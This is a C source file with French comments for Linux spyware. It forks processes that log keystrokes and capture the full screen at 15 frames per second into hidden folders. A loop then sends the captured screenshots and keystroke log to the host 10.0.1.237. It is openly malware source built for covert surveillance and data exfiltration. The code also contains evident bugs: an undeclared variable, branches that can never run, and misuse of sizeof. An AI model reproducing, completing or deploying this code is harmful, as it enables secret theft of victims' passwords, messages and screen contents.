#include "keylogger.h"
#include "for_all.c"

#define MAX_PATH 1024

const char *output_dir = ".output_screen";
const char *output_file = ".output_text/text.txt";
const char *output_file_dir = ".output_text";

#include <unistd.h>   // Pour sleep sous Linux/macOS
#define SLEEP(ms) usleep((ms) * 1000)

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <signal.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <time.h>

volatile sig_atomic_t keep_running = 1;

void handle_sigint(int sig) {
    keep_running = 0;
}

void save_bitmap(XImage *image, const char *filename) {
    FILE *f = fopen(filename, "wb");
    if (f == NULL) {
        perror("fopen");
        return;
    }

    unsigned int image_size = image->width * image->height * 3;
    unsigned int file_size = 54 + image_size;

    unsigned char header[54] = {
        'B', 'M', file_size & 0xFF, (file_size >> 8) & 0xFF,
        (file_size >> 16) & 0xFF, (file_size >> 24) & 0xFF,
        0, 0, 0, 0, 54, 0, 0, 0, 40, 0, 0, 0,
        image->width & 0xFF, (image->width >> 8) & 0xFF,
        (image->width >> 16) & 0xFF, (image->width >> 24) & 0xFF,
        image->height & 0xFF, (image->height >> 8) & 0xFF,
        (image->height >> 16) & 0xFF, (image->height >> 24) & 0xFF,
        1, 0, 24, 0, 0
    };

    fwrite(header, sizeof(unsigned char), 54, f);

    for (int y = image->height - 1; y >= 0; y--) {
        for (int x = 0; x < image->width; x++) {
            unsigned long pixel = XGetPixel(image, x, y);
            unsigned char blue = pixel & 0xFF;
            unsigned char green = (pixel >> 8) & 0xFF;
            unsigned char red = (pixel >> 16) & 0xFF;
            fwrite(&blue, 1, 1, f);
            fwrite(&green, 1, 1, f);
            fwrite(&red, 1, 1, f);
        }
    }

    fclose(f);
}

void capture_screen_at_fps(int target_fps, const char *output_directory) {
    mkdir(output_directory, 0755);  // Crée le dossier s'il n'existe pas

    Display *dpy = XOpenDisplay(NULL);
    if (!dpy) {
        fprintf(stderr, "Cannot open X display\n");
        return;
    }

    signal(SIGINT, handle_sigint); // Permet de stopper avec Ctrl+C

    Window root = DefaultRootWindow(dpy);
    XWindowAttributes gwa;
    XGetWindowAttributes(dpy, root, &gwa);

    int screen_width = gwa.width;
    int screen_height = gwa.height;

    struct timespec delay;
    delay.tv_sec = 0;
    delay.tv_nsec = (1000000000L / target_fps);

    while (keep_running) {
        XImage *image = XGetImage(dpy, root, 0, 0, screen_width, screen_height, AllPlanes, ZPixmap);
        if (image) {
            time_t timestamp = time(NULL);
            char filename[1024];
            snprintf(filename, sizeof(filename), "%s/%ld.bmp", output_directory, timestamp);
            save_bitmap(image, filename);
            printf("Image sauvegardée : %s\n", filename);
            XDestroyImage(image);
        }
        nanosleep(&delay, NULL);
    }

    XCloseDisplay(dpy);
    printf("\nCapture arrêtée proprement.\n");
}



void start(char *path, char *arg){

    pid_t pid = fork();  // Créer un processus enfant

    if (pid < 0) {
        // En cas d'erreur
        perror("fork");
        exit(1);
    }

    if (pid == 0) {
        // Code du processus enfant
        printf("Le processus enfant commence à exécuter une commande.\n");

        // Exemple de commande avec arguments
        char *args[] = {path, arg};

        // Remplacer le processus enfant par "ls -l /home"
        if (execvp(args[0], args) == -1) {
            // Si execvp échoue, afficher un message d'erreur
            perror("execvp échoué");
            exit(1);  // Terminer l'enfant si exec échoue
        }
    }
};

// Fonction pour récupérer le chemin d'un processus à partir de son PID
void get_parent_path1(pid_t pid, char *path, size_t path_size) {
    FILE *fp;
    char parent_pid[60];
    char proc_path[MAX_PATH];

    // Obtenir le PID du parent
    snprintf(path, path_size, "/proc/%d/stat", pid);
    fp = fopen(path, "r");
    if (fp == NULL) {
        perror("fopen");
        return;
    }

    // Lire l'ID du parent à partir du fichier stat (le PPid est dans la 4ème colonne)
    if (fscanf(fp, "%*d %*s %*c %s", parent_pid) != 1) {
        perror("fscanf");
        fclose(fp);
        return;
    }
    fclose(fp);

    // Obtenir le chemin du programme du parent à partir de /proc/[PPID]/exe
    snprintf(proc_path, sizeof(proc_path), "/proc/%s/exe", parent_pid);
    ssize_t len = readlink(proc_path, path, sizeof(path) - 1);
    if (len == -1) {
        perror("readlink");
        return;
    }

    path[len] = '\0';  // Ajouter le caractère de fin de chaîne
    printf("Le chemin du parent est: %s\n", path);
}

int main(int argc, char *argv[]) {
    pid_t pid = getpid();
    char path[4096];

    get_parent_path1(pid, path, sizeof(path));    
    mkdir(output_file_dir, 0755);
    
    char *filename = ".output_text/text.txt";

    // Teste si le fichier existe déjà
    FILE *test = fopen(filename, "r");
    if (test != NULL) {
        // Le fichier existe déjà
        fclose(test);
        printf("Le fichier existe déjà. On ne touche pas.\n");
    } else {
        // Le fichier n'existe pas, on le crée
        FILE *file = fopen(filename, "w");
        if (file != NULL) {
            fprintf(file, "Fichier nouvellement créé.\n");
            fclose(file);
            printf("Fichier créé avec succès !\n");
        } else {
            printf("Erreur lors de la création du fichier.\n");
        }
    }
    fclose(file);

    if (argc < 1){
        start(path, "1");
        start(path, "2");

    } else if (argc < 0) {
        if (strcmp(argv[0], "1") == 0){
            keylogger(output_file);
        }
        else {
            capture_screen_at_fps(15, output_dir);
        }
    }
    while (1){
        SLEEP(5);// 18000);
        // Envoi des fichiers toutes les 5 heures
        send_dir(output_dir, "10.0.1.237");
        send_file(output_file, "10.0.1.237", 1);
    }

    return 0;
};